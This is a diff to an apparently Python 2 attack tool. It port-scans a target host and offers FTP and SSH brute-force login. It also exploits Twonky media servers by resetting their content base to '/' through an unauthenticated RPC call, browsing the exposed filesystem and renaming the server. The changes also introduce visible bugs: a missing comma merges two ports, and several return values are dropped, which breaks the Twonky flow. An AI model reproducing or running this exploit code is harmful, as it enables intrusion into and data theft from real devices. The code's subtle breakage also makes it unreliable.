@@ -1,11 +1,14 @@
 import urllib3
 import sys
 import socket
-import paramiko
 import time
 from ftplib import FTP
 from xml.etree import ElementTree
 from subprocess import call
+try: 
+	import paramiko
+except:
+	print "paramiko not found! Run $ pip install paramiko"
 try:
 	import requests
 except:
@@ -45,7 +48,6 @@ def ftpConnector(host, port):
 				ftp.quit()
 				print (Fore.GREEN + "*** Credentials for ftp login on {0} found: {1}:{2}".format(host, user, passwd))
 	except:
-		time.sleep(1)
 		pass
 #Implement port
 def sshConnector(host, port):
@@ -74,10 +76,9 @@ def keywordDetector(line):
 
 def checkPort(host, port):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.settimeout(2)
 	try:
 		s.connect((host,int(port)))
-		s.close()
+		s.shutdown(2)
 		return True
 	except:
 		return False
@@ -160,11 +161,14 @@ def discoveryWebservices(host, port, protocol):
 		print (Fore.RED + "*** Exception: SSLError ***")
 	except requests.exceptions.ConnectionError:
 		print (Fore.RED + "*** Exception: ConnectionError ***")
-class Twonky:
-	def setContentBase(self, host, port):
+class Twonky():
+	host = ""
+	port = ""
+	version = ""
+	def setContentBase(self):
 		print (Fore.MAGENTA + "*** Set 'contentbase' path to '/'' ***")
 		payload = "\ncontentbase=/\n"
-		url = "http://{0}:{1}/rpc/set_all".format(host, port)
+		url = "http://{0}:{1}/rpc/set_all".format(self.host, self.port)
 		try:
 			response = requests.post(url, data=payload, timeout=5)
 			if response.status_code != 200:
@@ -176,58 +180,17 @@ class Twonky:
 			print (Fore.RED + "*** Timeout while setting contentbase path to '/' ***")
 			sys.exit()
 
-	def browser(self, host, port, version):
-		while True:
-			var = raw_input("path nr: ")
-			if var != "exit" and var != "exploit":
-				if version == "8.3-19" or version == "8.3-17":
-					url = "http://{0}:{1}/rpc/dir?path={2}".format(host, port, var)
-				else:
-					url = "http://{0}:{1}/rpc/dir/path={2}".format(host, port, var)
-				try:
-					response = requests.get(url)
-					print "-" * 30
-					for line in response.iter_lines():
-						if line :
-							if len(line) > 3:
-								if line[3] == "D":
-									line = line[:4].replace("D", " D ") + line[4:]
-									if keywordDetector(line[4:]):
-										print (Fore.RED + line)
-									else:
-										print (Fore.GREEN + line)
-								elif line[3] == "F":
-									line = line[:4].replace("F", " F ") + line[4:]
-									if keywordDetector(line[4:]):
-										print (Fore.RED + line)
-									else:
-										print line
-								else:
-									print line
-					print "-" * 30
-				except:
-					print "*** Error occured ***"
-					sys.exit()
-			elif var == "exploit":
-				payload = "\nfriendlyname=WDMyCloud\n"
-				url = "http://{0}:{1}/rpc/set_all".format(host, port)
-				response = requests.post(url, data=payload)
-				if response.status_code != 200:
-					print (Fore.RED + "*** Error status_code = " + str(response.status_code))
-			elif var == "exit":
-				sys.exit()
-
-	def serverInfo(self, host, port):
-		print (Fore.MAGENTA + "*** Get Serverdetails ***")
-		url = "http://{0}:{1}/rpc/get_friendlyname".format(host, port)
-		friendlyname = requests.get(url, timeout=5)
+	def serverInfo(self):
+		print (Fore.MAGENTA + "*** Get Serverdetails from Twonky ***")
+		url = "http://{0}:{1}/rpc/get_friendlyname".format(self.host, self.port)
+		friendlyname = requests.get(url, timeout=2)
 		if friendlyname.status_code == 200:
 			print (Fore.GREEN + "Server Name: {0}".format(friendlyname.text))
 		else:
-			print (Fore.RED + "*** Not authorized to access settings, password protection active! ***")
-		url = "http://{0}:{1}/rpc/info_status".format(host, port)
-		version = requests.get(url, timeout=5)
-		for line in version.iter_lines():
+			print (Fore.RED + "*** Not authorized to access settings, password protection active ***")
+		url = "http://{0}:{1}/rpc/info_status".format(self.host, self.port)
+		infoStatus = requests.get(url, timeout=2)
+		for line in infoStatus.iter_lines():
 			if line :
 				if line.find("version") != -1:
 					lineSplited = line.split("|")
@@ -255,7 +218,48 @@ class Twonky:
 					lineSplited = line.split("|")
 					videoCount = lineSplited[1]
 					print (Fore.GREEN + "Videos shared: {0}".format(videoCount))
-		return versionNumber
+		self.version = versionNumber
+
+	def browser(self):
+		while True:
+			var = raw_input("path nr: ")
+			if var != "exit" and var != "exploit":
+				if self.version == "8.3-19" or self.version == "8.3-17":
+					url = "http://{0}:{1}/rpc/dir?path={2}".format(self.host, self.port, var)
+				else:
+					url = "http://{0}:{1}/rpc/dir/path={2}".format(self.host, self.port, var)
+				try:
+					response = requests.get(url)
+					print "-" * 30
+					for line in response.iter_lines():
+						if line :
+							if len(line) > 3:
+								if line[3] == "D":
+									line = line[:4].replace("D", " D ") + line[4:]
+									if keywordDetector(line[4:]):
+										print (Fore.RED + line)
+									else:
+										print (Fore.GREEN + line)
+								elif line[3] == "F":
+									line = line[:4].replace("F", " F ") + line[4:]
+									if keywordDetector(line[4:]):
+										print (Fore.RED + line)
+									else:
+										print line
+								else:
+									print line
+					print "-" * 30
+				except:
+					print "*** Error occured ***"
+					sys.exit()
+			elif var == "exploit":
+				payload = "\nfriendlyname=WDMyCloud\n"
+				url = "http://{0}:{1}/rpc/set_all".format(self.host, self.port)
+				response = requests.post(url, data=payload)
+				if response.status_code != 200:
+					print (Fore.RED + "*** Error status_code = " + str(response.status_code))
+			elif var == "exit":
+				sys.exit()
 
 
 #*** Program start here ***
@@ -276,17 +280,16 @@ if __name__ == '__main__':
 
 		host = sys.argv[1]
 		print (Fore.MAGENTA + "https://www.shodan.io/host/{0}".format(host))
-		ports = ["21", "2121", "22", "2222", "80", "443", "5000", "8080", "8081", "8083", "8000", "8443", "9000", "9001", "9002", "9251"]
-		print (Fore.MAGENTA + "*** Start port discovery ***")
+		ports = ["21", "2121", "22", "2222", "80", "443", "5000", "8080", "8081", "8083", "8000", "8443", "9000", "9001", "9002", "9003" "9251"]
 		for port in ports:
 			if checkPort(host, port):
 				print (Fore.GREEN + "*** Port {0} opened ***".format(port))
 				if port == "21" or port == "2121":
-					ftp = raw_input("Attack FTP [N]? [Y, N] ")
+					ftp = raw_input("Brute force attack FTP [N]? [Y, N] ")
 					if ftp.upper() == "Y":
 						ftpConnector(host, port)
 				elif port == "22" or port == "2222":
-					ssh = raw_input("Attack SSH [N]? [Y, N] ")
+					ssh = raw_input("Brute force attack SSH [N]? [Y, N] ")
 					if ssh.upper() == "Y":
 						sshConnector(host, port)
 				elif port == "80" or port == "8080" or port == "8000" or port == "8081" or port == "5000":
@@ -302,9 +305,16 @@ if __name__ == '__main__':
 				elif port == "9000" or port == "9001" or port == "9002":
 					twonky = raw_input("Run Twonky browser on port {0} [default N]? [Y, N] ".format(port))
 					if twonky.upper() == "Y":
-						Twonky = Twonky()
+						twonkyObject = Twonky()
+						twonkyObject.host = host
+						twonkyObject.port = port
+						twonkyObject.version = twonkyObject.serverInfo()
+						if twonkyObject.setContentBase():
+							twonkyObject.browser()
+						'''
 						versionNumber = Twonky.serverInfo(host, port)
 						if Twonky.setContentBase(host, port):
 							Twonky.browser(host, port, versionNumber)
+						'''
 				elif port == "9251":
 					print "https://www.rapid7.com/db/modules/exploit/linux/misc/qnap_transcode_server"
